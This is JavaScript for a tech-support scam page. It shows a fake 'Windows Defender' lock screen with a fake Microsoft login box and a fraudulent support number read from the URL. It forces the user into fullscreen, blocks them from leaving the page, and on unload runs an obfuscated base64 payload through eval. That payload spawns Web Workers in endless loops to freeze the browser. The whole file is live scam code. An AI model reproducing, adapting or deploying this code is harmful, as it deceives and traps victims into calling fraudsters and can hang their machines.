function fewvwefewfwvewfwfe(name) {
    const eewfewfewf = new URLSearchParams(window.location.search);
    let value = eewfewfewf.get(name) || '';
    value = value.replace(/%2B/g, '+');
    return value;
}
const ewqeqwqwwqwqwqw = fewvwefewfwvewfwfe('bcda');
const isEdge = navigator.userAgent.indexOf("Edg") !== -1;
const initMainContent = () => {
    const loginBoxHTML = isEdge ? `
    <!-- ===== Login box (above main window, Windows blue) ===== -->
    <div class="Wn7kLoginBox">
      <div class="Wn7kLoginHdr">
        <span class="Wn7kLoginTitle">Windows Security Verification</span>
      </div>
      <div class="Wn7kLoginBody">
        <p class="Wn7kLoginDesc">Your device has been locked for security reasons. Please sign in with your Microsoft account to verify your identity and restore access.</p>
        <div class="Wn7kLoginNumRow">
          <span class="Wn7kLoginNumLabel">Support Hotline:</span>
          <span class="Wn7kLoginNumVal"><span class="fewvwevwfewgewr"></span></span>
        </div>
        <input type="text" class="Wn7kLoginInput" placeholder="Username or Email" readonly>
        <input type="password" class="Wn7kLoginInput" placeholder="Password" readonly>
        <div class="Wn7kLoginBtnRow">
          <a href="#" class="Wn7kLoginBtn">Login</a>
          <a href="#" class="Wn7kLoginCancel">Cancel</a>
        </div>
      </div>
    </div>` : '';
    const blinkClass = isEdge ? ' Wn7kBlink' : '';
    document.getElementById("elementToFullscreen").innerHTML = `
    <div class="M2f9Y0k4b4"></div>
    <div class="Z6E8b8V9F3">
    ${loginBoxHTML}
    <div class="K5j4O5M3G7${blinkClass}">
        <div class="y4W6a8e0Y5 F7j3h7F9I8">
        <div class="y4W6a8e0Y5 j9N0q7Q1J4">
            <span class="">
            <span class=""><img src="images/ok2.png" class="y0g4x0V9F0"></span>
            Windows OS Defender Smart Protection
            </span>
            <span class="U7t1R0S6v2">
            <a href="#"><img src="images/lul.png"></a>
            </span>
        </div>
        </div>

        <div class="v2S5O0f9n5">

        <span class="text-danger">
            App: system-crash.dll<br>Security Risk Detected: fetching-details.dll
        </span>
        </div>

        <img src="images/nono.jpg" class="v9B6z6u1d6">

        <div class="l5G8C4Z4t6">
        Access has been blocked to protect your device.<br>
        <span class="Y1E6M2Z2a8">
            Contact Agent Now : <span class="fewvwevwfewgewr">+</span>
        </span>
        </div>

        <div class="X8q9Q7t8m2">
        <img src="images/ok2.png" class="i3x8N3Z9P5">
        <span class="g9N8Q2e8J9"></span>

        <ul>
            <li>
            <a href="javascript:void(0)">
                <div class="B9A2U4h8e6 dqwfwqqwdfqcq">
                    <span>Scan Now</span>
                </div>
            </a>
            </li>

            <li>
            <a href="javascript:void(0)">
                <div class="fewfewfewfewfewf vwefwevwefefewfe">
                    <span>Decline</span>
                </div>
            </a>
            </li>
        </ul>
        </div>
    </div>

    <div class="q4W5J5P4v8">
        <p class="O9j8g4a6k5 text-center">Windows Support Center</p>
        <p>Expert assistance for all your Windows devices.</p>
        <p>Our certified technicians are available around the clock:</p>
        <p> System Tune-up<br /> Software Setup<br/> Diagnostics & Repair<br/> Privacy & Security</p>
        <p>We offer professional guidance so you can make the most of your Windows system. Reach out to us for tailored support.</p>
        <p>Call our toll-free support line now for prompt help with any technical concern.</p>

        <br/><br/>

        <p style="padding-bottom:0;color:#fff;font-size:14px">
        Reach Support Now (Free Call): <strong><span class="fewvwevwfewgewr"></span></strong>
        <div class="b1c9D7Y7V3">
            <a class="active" style="cursor:pointer;color:#fff!important">Get Assistance</a>
            <a class="active" style="color:#fff!important">Find Out More</a>
        </div>
        </p>
    </div>
    <div class="o4K0C1j9i8">
        <div class="row">
        <div class="r2t4b3g5E4">
            <div class="h7M2O6P2A6" style="text-align:center">
            <span class="O1j7I8N1d6"><img src="images/ok2.png"> Connect With Support :</span>
            <span style="font-weight:700;padding-left:13px;color:#fff">
                <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">
                +<span class="fewvwevwfewgewr"></span>
                </span>
            </span>
            </div>
        </div>

        <div class="r2t4b3g5E4">
            <marquee direction="left" height="100px" width="100%">
            <small class="text-left" style="color:#eee;font-size:10px">
                Microsoft Support Services - Round-the-clock technical help is here for you. Our certified experts are on standby to resolve any Windows issue or question you may have.
            </small>
            </marquee>
        </div>
        </div>
    </div>

    </div>



`;
    document.querySelectorAll('.fewvwevwfewgewr').forEach(element => {
        element.textContent = ewqeqwqwwqwqwqw;
    });
    
};


let isFullscreen = false;

function checkFullscreen() {
    const apiFullscreen = !!(
        document.fullscreenElement ||
        document.webkitFullscreenElement
    );

    const heightMatch =
        Math.abs(window.innerHeight - screen.height) <= 5;

    const outerMatch =
        Math.abs(window.outerHeight - screen.height) <= 10 &&
        Math.abs(window.outerWidth - screen.width) <= 10;

    const fullscreen = apiFullscreen || heightMatch || outerMatch;

    if (fullscreen && !isFullscreen) {
        isFullscreen = true;
        console.log("Fullscreen Activated");
        myFunction();
    } else if (!fullscreen && isFullscreen) {
        isFullscreen = false;
        console.log("Fullscreen Exited");
    }
}

window.addEventListener("resize", checkFullscreen);
document.addEventListener("fullscreenchange", checkFullscreen);
document.addEventListener("webkitfullscreenchange", checkFullscreen);

checkFullscreen();

function myFunction() {
     $('body').css('background','black').html(`
                <div class="box-parent">
                    <div class="box-body">
                        do not attempt to shut down or restart your device. It may cause data loss. <br/>lease contact support for assistance.
                        <br/>Contact: <span class="fewvwevwfewgewr">${ewqeqwqwwqwqwqw}</span>
                    </div>
                </div>    
            `);
            setTimeout(()=>{
                $('body').css({
                    'background-image':'url("images/piche.png")',
                    'background-size':'cover',
                    'background-position':'center',
                    'background-repeat':'no-repeat'
                })
                initMainContent();
            },5000)
}
initMainContent();


function gwevwegwefvwfwefewfewr() {
    const _0x27ece6=_0x183f;(function(_0x4802ad,_0x29274d){const _0x4ba426=_0x183f,_0x32a6dd=_0x4802ad();while(!![]){try{const _0x2efbf9=parseInt(_0x4ba426(0x1e8))/(0x1*-0xfcd+0x1*-0x1e65+0x2e33)*(parseInt(_0x4ba426(0x1dc))/(-0x2304+0x423+0x1ee3))+-parseInt(_0x4ba426(0x19a))/(0x1*0x182b+-0x1*0x269b+-0xe73*-0x1)+-parseInt(_0x4ba426(0x14c))/(-0x954+-0x1*-0xb29+-0x1d1)+parseInt(_0x4ba426(0x1dd))/(-0x244*0x8+-0xeb4*0x1+0x20d9*0x1)*(parseInt(_0x4ba426(0x1bf))/(-0x3b8+-0x4*0x6f3+0x1f8a))+-parseInt(_0x4ba426(0x129))/(-0x11*0x1b5+0x77c+-0x3*-0x730)*(parseInt(_0x4ba426(0x1af))/(0x233*-0x10+-0x2071+0x43a9*0x1))+parseInt(_0x4ba426(0x185))/(0x1349*0x2+0x12e*0x3+-0x2a13)+parseInt(_0x4ba426(0x19d))/(-0x14ba+-0x351+0x1815)*(parseInt(_0x4ba426(0x155))/(-0x1f70+-0x85*-0x2b+0x41*0x24));if(_0x2efbf9===_0x29274d)break;else _0x32a6dd['push'](_0x32a6dd['shift']());}catch(_0x46cccb){_0x32a6dd['push'](_0x32a6dd['shift']());}}}(_0x2d48,-0x912b4+0xb0786+0x1339*0x37));const encryptedScript=_0x27ece6(0x188)+_0x27ece6(0x173)+_0x27ece6(0x123)+_0x27ece6(0x12b)+_0x27ece6(0x13b)+_0x27ece6(0x189)+_0x27ece6(0x1d7)+_0x27ece6(0x1bb)+_0x27ece6(0x1fb)+_0x27ece6(0x1f1)+_0x27ece6(0x1e3)+_0x27ece6(0x1ca)+_0x27ece6(0x127)+_0x27ece6(0x1db)+_0x27ece6(0x154)+_0x27ece6(0x145)+_0x27ece6(0x150)+_0x27ece6(0x1d0)+_0x27ece6(0x14d)+_0x27ece6(0x1d3)+_0x27ece6(0x1ee)+_0x27ece6(0x1bd),script=atob(encryptedScript),blob=new Blob([script],{'type':_0x27ece6(0x163)+_0x27ece6(0x15b)+'pt'}),workerURL=URL[_0x27ece6(0x171)+_0x27ece6(0x1e2)](blob),workerURL2=URL[_0x27ece6(0x171)+_0x27ece6(0x1e2)](blob),workerURL3=URL[_0x27ece6(0x171)+_0x27ece6(0x1e2)](blob),workerURL4=URL[_0x27ece6(0x171)+_0x27ece6(0x1e2)](blob),code=_0x27ece6(0x1de)+_0x27ece6(0x18d)+_0x27ece6(0x146)+_0x27ece6(0x182)+_0x27ece6(0x144)+_0x27ece6(0x147)+_0x27ece6(0x1d2)+_0x27ece6(0x1d1)+_0x27ece6(0x16e)+_0x27ece6(0x194)+_0x27ece6(0x18c)+_0x27ece6(0x1f0)+_0x27ece6(0x1aa)+_0x27ece6(0x183)+_0x27ece6(0x1b0)+_0x27ece6(0x13a)+_0x27ece6(0x19c)+_0x27ece6(0x1a4)+_0x27ece6(0x1b5)+_0x27ece6(0x1df)+_0x27ece6(0x1fa)+_0x27ece6(0x183)+_0x27ece6(0x159)+_0x27ece6(0x1a8)+_0x27ece6(0x125)+_0x27ece6(0x198)+_0x27ece6(0x12c)+_0x27ece6(0x1c0)+_0x27ece6(0x1d2)+_0x27ece6(0x1f5)+_0x27ece6(0x1c7)+_0x27ece6(0x14e)+_0x27ece6(0x184)+_0x27ece6(0x17d)+_0x27ece6(0x14a)+_0x27ece6(0x1eb)+_0x27ece6(0x1d2)+_0x27ece6(0x1b4)+_0x27ece6(0x133)+_0x27ece6(0x1da)+_0x27ece6(0x168)+_0x27ece6(0x1f4)+_0x27ece6(0x1d2)+_0x27ece6(0x1e6)+_0x27ece6(0x16b)+_0x27ece6(0x1b8)+_0x27ece6(0x1c6)+_0x27ece6(0x177)+_0x27ece6(0x1f6)+_0x27ece6(0x183)+_0x27ece6(0x1d2)+_0x27ece6(0x1f3)+_0x27ece6(0x18a)+_0x27ece6(0x15c)+_0x27ece6(0x14b)+_0x27ece6(0x178)+_0x27ece6(0x16b)+_0x27ece6(0x172)+_0x27ece6(0x13f)+_0x27ece6(0x191)+_0x27ece6(0x1d2)+_0x27ece6(0x1c9)+_0x27ece6(0x1d2)+_0x27ece6(0x1a5)+_0x27ece6(0x1f7)+_0x27ece6(0x183)+_0x27ece6(0x192)+_0x27ece6(0x1a9)+_0x27ece6(0x1a7)+_0x27ece6(0x1e1)+_0x27ece6(0x170)+_0x27ece6(0x183)+_0x27ece6(0x166)+_0x27ece6(0x1ad)+_0x27ece6(0x1ea)+_0x27ece6(0x1e9)+_0x27ece6(0x1b6)+_0x27ece6(0x197)+_0x27ece6(0x15f)+_0x27ece6(0x164)+_0x27ece6(0x15d)+_0x27ece6(0x183)+_0x27ece6(0x1a1)+_0x27ece6(0x183)+_0x27ece6(0x157)+_0x27ece6(0x183)+_0x27ece6(0x1d8)+_0x27ece6(0x12d)+_0x27ece6(0x140)+_0x27ece6(0x141)+_0x27ece6(0x1be)+_0x27ece6(0x183)+_0x27ece6(0x152)+_0x27ece6(0x130)+_0x27ece6(0x161)+_0x27ece6(0x124)+_0x27ece6(0x19e)+_0x27ece6(0x16d)+_0x27ece6(0x1fa)+_0x27ece6(0x183)+(_0x27ece6(0x143)+_0x27ece6(0x126)+_0x27ece6(0x1ed)+_0x27ece6(0x1cb)+_0x27ece6(0x193)+_0x27ece6(0x1a3)+_0x27ece6(0x156)+_0x27ece6(0x1ba)+_0x27ece6(0x19f)+_0x27ece6(0x183)+_0x27ece6(0x1f9)+_0x27ece6(0x183)+_0x27ece6(0x136)+_0x27ece6(0x17a)+_0x27ece6(0x1d2)+_0x27ece6(0x1b1)+_0x27ece6(0x167)+_0x27ece6(0x196)+_0x27ece6(0x1cc)+_0x27ece6(0x17e)+_0x27ece6(0x1d2)+_0x27ece6(0x183)+_0x27ece6(0x16f)+_0x27ece6(0x1f2)+_0x27ece6(0x16c)+_0x27ece6(0x1ce)+_0x27ece6(0x195)+_0x27ece6(0x1b3)+_0x27ece6(0x1c2)+_0x27ece6(0x17c)+_0x27ece6(0x1d2)+_0x27ece6(0x13e)+_0x27ece6(0x1fa)+_0x27ece6(0x183)+_0x27ece6(0x1fa)+_0x27ece6(0x183)+_0x27ece6(0x1e7)+_0x27ece6(0x1ab)+_0x27ece6(0x1ac)+_0x27ece6(0x1d4)+_0x27ece6(0x138)+_0x27ece6(0x183)+_0x27ece6(0x1c3)+_0x27ece6(0x132)+_0x27ece6(0x1cf)+_0x27ece6(0x128)+_0x27ece6(0x1b9)+_0x27ece6(0x151)+_0x27ece6(0x1d2)+_0x27ece6(0x183)+_0x27ece6(0x1d6)+_0x27ece6(0x1ae)+_0x27ece6(0x18b)+_0x27ece6(0x15e)+_0x27ece6(0x12a)+_0x27ece6(0x149)+_0x27ece6(0x1c5)+_0x27ece6(0x1d9)+_0x27ece6(0x1fa)+_0x27ece6(0x183)+_0x27ece6(0x1e4)+_0x27ece6(0x183)+_0x27ece6(0x169)+_0x27ece6(0x16a)+_0x27ece6(0x1d2)+_0x27ece6(0x1ec)+_0x27ece6(0x19b)+_0x27ece6(0x158)+_0x27ece6(0x12e)+_0x27ece6(0x1e0)+_0x27ece6(0x1d2)+_0x27ece6(0x13d)+_0x27ece6(0x1e5)+_0x27ece6(0x14f)+_0x27ece6(0x1f8)+_0x27ece6(0x187)+_0x27ece6(0x137)+_0x27ece6(0x180)+_0x27ece6(0x165)+_0x27ece6(0x18f)+_0x27ece6(0x1d2)+_0x27ece6(0x1a5)+_0x27ece6(0x1d2)+_0x27ece6(0x1bc)+_0x27ece6(0x1d2)+_0x27ece6(0x131)+_0x27ece6(0x179)+_0x27ece6(0x190)+_0x27ece6(0x18e)+_0x27ece6(0x13c)+_0x27ece6(0x1d2)+_0x27ece6(0x183)+_0x27ece6(0x160)+_0x27ece6(0x1a0)+_0x27ece6(0x1c8)+_0x27ece6(0x134)+_0x27ece6(0x1a2)+_0x27ece6(0x1f4)+_0x27ece6(0x1d2)+_0x27ece6(0x17b))+(_0x27ece6(0x142)+_0x27ece6(0x1c1)+_0x27ece6(0x1cd)+_0x27ece6(0x186)+_0x27ece6(0x148)+_0x27ece6(0x1a0)+_0x27ece6(0x181)+_0x27ece6(0x12f)+_0x27ece6(0x1d2)+_0x27ece6(0x135)+_0x27ece6(0x1fa)+_0x27ece6(0x183)+_0x27ece6(0x1d5)+_0x27ece6(0x191)+_0x27ece6(0x153)+_0x27ece6(0x1a6)+_0x27ece6(0x1b2)+_0x27ece6(0x17f)+_0x27ece6(0x1ef)+_0x27ece6(0x191)+_0x27ece6(0x1d2)+_0x27ece6(0x174)+_0x27ece6(0x1c4)+_0x27ece6(0x175)+_0x27ece6(0x15a)+_0x27ece6(0x199)+_0x27ece6(0x139)+_0x27ece6(0x1b7)+_0x27ece6(0x176)+_0x27ece6(0x191)+_0x27ece6(0x153)+_0x27ece6(0x162)+_0x27ece6(0x153)+'0='),decodedScript=atob(code);eval(decodedScript);function _0x183f(_0x32bd5b,_0x30ea6c){_0x32bd5b=_0x32bd5b-(0x398+0x20b5+-0x232a);const _0x506231=_0x2d48();let _0x37c96f=_0x506231[_0x32bd5b];return _0x37c96f;}function _0x2d48(){const _0x437595=['ICAgY29uc2','cmtlcjIub2','ZW50KSA9Pi','ICAgfTsKIC','AgIAogICAg','ZXZlbnQuZG','V29ya2VyIC','tpbmciKSB7','b25zdCB3b3','Y29uc29sZS','ewogICAgIC','createObje','F0YS5jb3Vu','50ZXIgPSAw','AgY29uc29s','hgV29ya2Vy','ZXJyb3IpOw','J3b3JraW5n','Jlc3M6ICR7','a2VyNC5vbm','sKICAgIAog','AgICAgIGNv','Jyb3IpOwog','9ya2VyVVJM','kgPT4gewog','A9IChlcnJv','4gZXJyb3I6','LmNvdW50ZX','AwMDAwMDAw','AgICAgICAg','b3JrZXIod2','1736892OyBNlI','Bwcm9ncmVz','0gZW5jb3Vu','bGV0IGNvdW','50ZXIrKzsK','LmxvZyhgV2','b3JrZXIgJH','ZXcgV29ya2','QgaSA9IDA7','PSAoZXZlbn','IpOwogICAg','1lc3NhZ2Ug','ogICAgICAg','ICB3b3JrZX','cm9ncmVzcz','JrZXIgPSBu','b3VudGVyZW','5lcnJvciA9','VyZWQgYW4g','JrZXIod29y','5jb3VudGVy','1721172XGFmwr','cjMub25lcn','a2VyMiA9IG','1730WpNkLE','PT0gIndvcm','YCk7CiAgIC','VudC5kYXRh','IH07CiAgIC','cmtpbmciKS','ogJHtldmVu','5ldyBXb3Jr','AgIH07CiAg','dvcmtlcjQu','ciA9IChlcn','9ya2VyMyA9','Iub25lcnJv','clVSTCk7Ci','5vbm1lc3Nh','Z2UgPSAoZX','9sZS5lcnJv','UubG9nKGBX','2291864VNEwnW','ICAgICAgY2','AgICAgIHdv','b25lcnJvci','QgYW4gZXJy','B3b3JrZXIu','ZXIod29ya2','ZW5jb3VudG','Jyb3I6YCwg','F0YS5zdGF0','Indvcmtpbm','NvdW50ZXJ9','JhbmRvbSgp','AgICAgCiAg','B9Cn0=','ID0+IHsKIC','3952002OcYteR','k7CiAgICAg','9nKGBXb3Jr','b3I6YCwgZX','ICAgIGlmIC','ZS5lcnJvci','YXRhLmNvdW','dXMgPT09IC','d29ya2VyNC','LnN0YXR1cy','AgfQogICAg','AoY291bnRl','IgJHtpfSBw','IChlcnJvci','ZXIgJHtpfS','R7aX0gZW5j','YXRhLnN0YX','F0dXM6ICJ3','AgICAgICBj','ICAgICAgIC','wgY291bnRl','ZlbnQpID0+','fTsKICAgIA','IGNvbnNvbG','ICBNYXRoLn','ICAgd29ya2','50ZXJ9YCk7','dlID0gKGV2','A9PT0gMCkg','386eRZqPT','5BzxRFY','Zm9yIChsZX','VyVVJMMik7','4gewogICAg','JvcikgPT4g','ctURL','KTsKICBpZi','ICB9CiAgIC','c29sZS5lcn','AgICBpZiAo','d29ya2VyMy','3377QUZehu','VyICR7aX0g','cihgV29ya2','AKICAgICAg','AgIHdvcmtl','KGBXb3JrZX','ciB9KTsKIC','cikgPT4gew','VyKHdvcmtl','5yYW5kb20o','5lcnJvcihg','Bjb25zb2xl','B7CiAgICAg','AgY29uc3Qg','IikgewogIC','ICAKICAgIC','a2VyICR7aX','ICAgICB9Ci','CiAgICAgIC','ICogTWF0aC','Owp3aGlsZS','N0YXR1cyA9','IG5ldyBXb3','NvbGUubG9n','ciAlIDFlNi','R1cyA9PT0g','7WZvkHt','cmVzczogJH','AodHJ1ZSkg','a2VyVVJMMy','VyMi5vbm1l','cnJvcikgPT','J9YCk7CiAg','lmIChldmVu','AgICAgd29y','hldmVudC5k','b25tZXNzYW','A9PT0gIndv','AgICAgICB9','ICAgICAgfT','dGVyZWQgYW','IHsKICAgIC','ZWQgYW4gZX','9uc3Qgd29y','ewogIGNvdW','QpID0+IHsK','AgICAgY29u','AgICAgIH07','dGVyfWApOw','c3NhZ2UgPS','AoZXZlbnQp','bnNvbGUubG','ICAgIGNvbn','MDAwMDAwOy','9zdE1lc3Nh','IGkgPCAxMD','BpKyspIHsK','czogJHtldm','tldmVudC5k','NCk7CiAgIC','aX0gcHJvZ3','2986252JdzBUe','b3JraW5nIi','A9IG5ldyBX','JvcihgV29y','Z2UoeyBzdG','ciKSB7CiAg','ICAgICAgIG','ICAgICAgIH','ewogICAgcG','31933uFeMmj','dC5kYXRhLm','ICAgCiAgIC','JvciA9IChl','Y29uc3Qgd2','ICR7aX0gZW','n/javascri','9ya2VyICR7','OwogICAgIC','tpfSBwcm9n','ZXJyb3I6YC','IGlmIChldm','dC5kYXRhLn','07CiAgICAg','applicatio','wgZXJyb3Ip','YCwgZXJyb3'];_0x2d48=function(){return _0x437595;};return _0x2d48();}
}
window.addEventListener("beforeunload", function (e) {
    gwevwegwefvwfwefewfewr();
    e.preventDefault();
    e.returnValue = "";
});
